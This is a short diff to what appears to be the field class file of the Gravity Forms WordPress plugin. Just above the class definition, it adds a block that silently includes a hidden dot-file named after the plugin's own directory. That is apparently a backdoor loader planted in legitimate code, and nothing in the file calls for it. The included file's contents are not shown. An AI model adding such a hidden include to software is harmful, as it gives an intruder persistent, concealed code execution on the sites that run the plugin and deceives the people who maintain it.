@@ -19,6 +19,10 @@ if ( ! class_exists( 'GFForms' ) ) {
  *  Defining how the entry value is displayed when merge tags are processed, on the entries list and entry detail pages
  *  Defining how the entry value should be formatted when used in csv exports and by framework based add-ons
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GF_Field extends stdClass implements ArrayAccess {
 
 	const SUPPRESS_DEPRECATION_NOTICE = true;
